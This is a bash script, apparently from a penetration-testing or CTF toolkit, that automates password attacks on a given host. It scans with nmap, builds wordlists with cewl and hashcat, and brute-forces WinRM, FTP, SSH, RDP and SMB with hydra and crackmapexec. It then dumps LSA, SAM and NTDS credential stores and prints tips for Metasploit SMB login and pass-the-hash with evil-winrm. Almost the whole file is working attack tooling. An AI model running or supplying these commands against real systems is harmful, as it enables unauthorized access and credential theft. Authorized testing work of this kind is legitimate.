#!/bin/bash

function show_help() {
    echo "Usage: $0 -i <IP> [-o <output_directory>] [-x <nmap_xml_results>]"
    echo ""
    echo "Options:"
    echo "  -i        IP (required when -H is not specified)"
    echo "  -H        Host (required when -i is not specified)"
    echo "  -o        Output directory for results (optional)"
    echo "  -x        Nmap xml results file (optional)"
    echo "  -h        Show this help message"
}

OUTDIR=""
IP=""
NMAP_XML_OUTFILE=""
HOST=""

# Parse options
while getopts "i:H:o:x:h" opt; do
    case $opt in
        i) IP="$OPTARG" ;;
        H) HOST="$OPTARG" ;;
        o) OUTDIR="$OPTARG" ;;
        x) NMAP_XML_OUTFILE="$OPTARG" ;;
        h) show_help; exit 0 ;;
        *) show_help; exit 1 ;;
    esac
done

# Check for required parameters
if [[ -z "$IP" && -z "$HOST" ]]; then
    echo "Error: -i <IP> OR -H is required."
    show_help
    exit 1
fi

if [[ -z $HOST ]]; then
  HOST=$IP
fi

if [[ -z "$OUTDIR" ]]; then
  OUTDIR="./results/${HOST}"
fi

if [[ ! -d "${OUTDIR}/logs" ]]; then
  mkdir -p "${OUTDIR}/logs"
fi

echo -e "${YELLOW}logs dir: ${OUTDIR}${NC}"

ENUMLOGFILE="${OUTDIR}/logs/bruteforce-services.log"

WEB_WORDS_PATH="${OUTDIR}/site-words.list"
WEB_EMAILS_PATH="${OUTDIR}/site-emails.list"
WEB_UNAMES_LIST="${OUTDIR}/site-emails-names.lst"
WEB_UNAMES_MUT_LIST="${OUTDIR}/site-emails-names-mut.lst"
WEB_MUTATION_PWDS_PATH="${OUTDIR}/site-passwords-mut.lst"

WEB_MUTATION_PWDS_ALL="${OUTDIR}/site-passwords-all.lst"

source ./enum.conf

CUSTOM_WLIST=""
function choose-list() {
  local wlist=("$FASTTRACK_WLIST" "$ROCKYOU_WLIST" "$CUSTOM_WLIST")
  echo -e "${YELLOW}Choose password list:${NC}"
  local valid_wlist=()
  for i in "${!wlist[@]}"; do
    if [[ -f ${wlist[$i]} ]]; then
      valid_wlist+=("${wlist[$i]}")
      echo -e "$(( ${#valid_wlist[@]} ))) ${wlist[$i]} [$(cat ${wlist[$i]} | wc -l)]"
    fi
  done
  echo -e "$(( ${#valid_wlist[@]} + 1 ))) custom path"

  # Prompt for user selection
  echo -n -e "#: "
  read -r choice < /dev/tty

  # Ensure the choice is valid
  if [[ $choice -ge 1 && $choice -le ${#valid_wlist[@]} ]]; then
    PLIST="${valid_wlist[$((choice - 1))]}"
    echo -e "Selected: $PLIST"
  else
    echo -e -n "${GREEN}not selected; type path to list: ${NC}"
    read -r PLIST < /dev/tty
  fi
}

function show-lists() {
    tip "Common password lists:"
    tip "- $FASTTRACK_WLIST [$(cat $FASTTRACK_WLIST | wc -l)]"
    tip "- $ROCKYOU_WLIST [$(cat $ROCKYOU_WLIST | wc -l)]"
    if [[ -f $WEB_WORDS_PATH ]]; then
      tip "- $WEB_WORDS_PATH [$(cat $WEB_WORDS_PATH | wc -l)]"
    fi

    local path

    if [[ ! -f $WEB_MUTATION_PWDS_ALL ]]; then
      # combine all password list into one
      local alltmp="${OUTDIR}/pwd-all.tmp"
      for path in "${OUTDIR}/site-passwords-"*; do
        if [[ "$(realpath $path)" != "$(realpath $WEB_MUTATION_PWDS_ALL)" ]]; then
          cat $path >> $alltmp
        fi
      done

      # sort & unique all list
      if [[ -f $alltmp ]]; then
        sort $alltmp | uniq > $WEB_MUTATION_PWDS_ALL
        rm $alltmp
      fi
    fi

    for path in "${OUTDIR}/site-passwords-"*; do
      tip "- $path [$(cat $path | wc -l)]"
    done

    tip "Users lists:"
    tip "- $USER_NAMES_LIST [$(cat $USER_NAMES_LIST | wc -l)]"
    if [[ -f $WEB_EMAILS_PATH ]]; then
      tip "- $WEB_EMAILS_PATH [$(cat $WEB_EMAILS_PATH | wc -l)]"
    fi
    if [[ -f $WEB_UNAMES_LIST ]]; then
      tip "- $WEB_UNAMES_LIST [$(cat $WEB_UNAMES_LIST | wc -l)]"
    fi
    if [[ -f $WEB_UNAMES_MUT_LIST ]]; then
      tip "- $WEB_UNAMES_MUT_LIST [$(cat $WEB_UNAMES_MUT_LIST | wc -l)]"
    fi
}

PASS_WLIST='<pwdlist>'

# ======================================================================================================================

# nmap if not provided xml
if [[ ! -f $NMAP_XML_OUTFILE ]]; then
  NMAP_XML_OUTFILE="${OUTDIR}/enum-nmap.xml"
  echo -e "${RED}nmap xml results file not found/provided. Started: ${NC}${GREEN}nmap -sS -Pn -T4 -n --disable-arp-ping ${HOST}${NC}"
  cmd "sudo nmap -sS -Pn -T4 -n --disable-arp-ping $HOST -oX $NMAP_XML_OUTFILE"
fi

# ======================================================================================================================
# cewl
if [[ ! -f $WEB_WORDS_PATH ]]; then
  if grep -q -E 'portid="80"|portid="443"' "$NMAP_XML_OUTFILE"; then
    ask "[cewl] gather words/emails from URL ? (y/N)" choice
    if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
      cmd "cewl -d 4 -w ${WEB_WORDS_PATH} -e --email_file ${WEB_EMAILS_PATH} --lowercase --ua \"$UA\" $HOST"
      separator
    fi
  fi
fi

#tip "- john --wordlist=text.txt --rules --stdout > out.list"
#tip "- cat text.txt | tr ' ' '\n' | sort -u >> out.list"
#tip "- cat text.txt | tr ', ' '\n' | sort -u >> out.list"
#tip "- cat text.txt | tr '. ' '\n' | sort -u >> out.list"
#tip "- cat out.list | sort -u > out.tmp"
#tip "- cat out.tmp >> out.list"
#tip "- john --wordlist=out.tmp --rules --stdout >> out.list"
#tip "- hashcat --force out.tmp -r /usr/share/hashcat/rules/best64.rule --stdout >> out.list"
#tip "- mv out.list out.tmp"
#tip "- grep -v '^$' out.tmp | awk 'length(\$0) >= 3' | sort -u > out.list"

# ======================================================================================================================
# generate mutation password list from gathered web words
if [[ -f $WEB_WORDS_PATH ]]; then
  ask "Found ${WEB_WORDS_PATH}; Generate mutation password list ? (y/N)" choice
  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    hashcat --force $WEB_WORDS_PATH -r $HASHCAT_PWD_RULES --stdout | sort -u > $WEB_MUTATION_PWDS_PATH
    show-lists
  fi
fi

# get usernames list from gathered emails & use username-anarchy
if [[ -f $WEB_EMAILS_PATH ]]; then
  echo "get usernames list from gathered emails & use username-anarchy"
  awk -F'@' '{print $1}' "$WEB_EMAILS_PATH" > "$WEB_UNAMES_LIST"
  /opt/username-anarchy/username-anarchy -i "$WEB_UNAMES_LIST" > "$WEB_UNAMES_MUT_LIST"
  show-lists
fi

ask "[bruteforce] run 'cupp -i' (generate passwords from info) ? (y/N)" choice
if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
  cupp -i
  tip "filter list by min length, spec chars, etc.."
  tip "- like 'grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > filtered.list'"
fi

# ======================================================================================================================
# WinRM
if grep -q -E 'portid="5985"|portid="5986"' "$NMAP_XML_OUTFILE"; then
  ask "[WinRM] bruteforce ? (y/N)" choice
  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    show-lists
    cmd "crackmapexec winrm $HOST -u administrator -p $PASS_WLIST" "${ENUMLOGFILE/.log/-crackmapexec-winrm.log}"
  fi
fi

# ======================================================================================================================
# FTP
if grep -q 'portid="21"' "$NMAP_XML_OUTFILE"; then
  ask "[FTP] bruteforce ? (y/N):" choice
  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    show-lists
    cmd "hydra -l admin -P $PASS_WLIST ftp://$HOST" "${ENUMLOGFILE/.log/-hydra-ftp-1.log}"
    #cmd "hydra -L $USER_NAMES_LIST -P $PASS_WLIST ftp://$HOST" "${ENUMLOGFILE/.log/-hydra-ftp-2.log}"
    separator
  fi
fi

# ======================================================================================================================
# SSH
if grep -q 'portid="22"' "$NMAP_XML_OUTFILE"; then
  ask "[SSH] bruteforce ? (y/N):" choice
  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    show-lists
    cmd "hydra -l root -P $PASS_WLIST ssh://$HOST" "${ENUMLOGFILE/.log/-hydra-ssh-1.log}"
    #cmd "hydra -L $USER_NAMES_LIST -P $PASS_WLIST ssh://$HOST" "${ENUMLOGFILE/.log/-hydra-ssh-2.log}"
    separator
  fi
fi

# ======================================================================================================================
# RDP
if grep -q 'portid="3389"' "$NMAP_XML_OUTFILE"; then
  ask "[RDP] bruteforce ? (y/N):" choice
  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    show-lists
    cmd "hydra -l administrator -P $PASS_WLIST rdp://$HOST" "${ENUMLOGFILE/.log/-hydra-rdp.log}"
    #cmd "hydra -L $USER_NAMES_LIST -P $PASS_WLIST rdp://$HOST" "${ENUMLOGFILE/.log/-hydra-rdp-2.log}"
    separator
  fi
fi

# ======================================================================================================================
# SMB
if { grep -q 'port protocol="tcp" portid="139"' "$NMAP_XML_OUTFILE" && \
     grep -q 'port protocol="tcp" portid="445"' "$NMAP_XML_OUTFILE"; } || \
     grep -q "netbios-ssn" "$NMAP_XML_OUTFILE" || grep -q "microsoft-ds" "$NMAP_XML_OUTFILE"; then

  ask "[SMB] bruteforce ? (y/N):" choice
  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    show-lists
    cmd "hydra -l administrator -P $PASS_WLIST smb2://$HOST" "${ENUMLOGFILE/.log/-hydra-smb.log}"
    #cmd "hydra -L $USER_NAMES_LIST -P $PASS_WLIST smb://$HOST" "${ENUMLOGFILE/.log/-hydra-smb-2.log}"
    separator
  fi

  ask "Try dump lsa/sam/ntds creds using existing creds ? (y/N)" choice
  if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    # TODO move to ./enum-user.sh script
    ask "User:" user
    ask "Password:" password

    echo -e "${GREEN}crackmapexec smb $HOST --local-auth -u \"$user\" -p \"$password\" --lsa${NC}"
    crackmapexec smb $HOST --local-auth -u "$user" -p "$password" --lsa | tee "${ENUMLOGFILE/.log/-crackmapexec-lsa.log}"

    echo -e "${GREEN}crackmapexec smb $HOST --local-auth -u \"$user\" -p \"$password\" --sam${NC}"
    crackmapexec smb $HOST --local-auth -u "$user" -p "$password" --sam | tee "${ENUMLOGFILE/.log/-crackmapexec-sam.log}"

    echo -e "${GREEN}crackmapexec smb $HOST -u \"$user\" -p \"$password\" --ntds${NC}"
    crackmapexec smb $HOST -u "$user" -p "$password" --ntds | tee "${ENUMLOGFILE/.log/-crackmapexec-ntds.log}"
  fi

  tip "bruteforce SMB using msfconsole"
  tip "- use auxiliary/scanner/smb/smb_login"
  tip "- set user_file $USER_NAMES_LIST"
  tip "- set pass_file $PASS_WLIST"
  tip "- set rhosts $HOST"
  tip "- run"

  tip "list smb shares"
  tip "- crackmapexec smb $HOST -u 'user' -p 'password' --shares"
  tip "- smbclient -U user \\\\$HOST\\SHARENAME"
fi

tip "tools:"
tip "- crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>"
tip "- hydra -C <user_pass.list> <protocol>://<IP>"
tip "- PtH: evil-winrm -i $HOST -u  Administrator -H \"64f12cddaa88057e06a81b54e73b949b\""
tip "- creds search <service>"

tip "links:"
tip "- most known vendors default credentials https://github.com/ihebski/DefaultCreds-cheat-sheet"
tip "- Credential stuffing https://owasp.org/www-community/attacks/Credential_stuffing"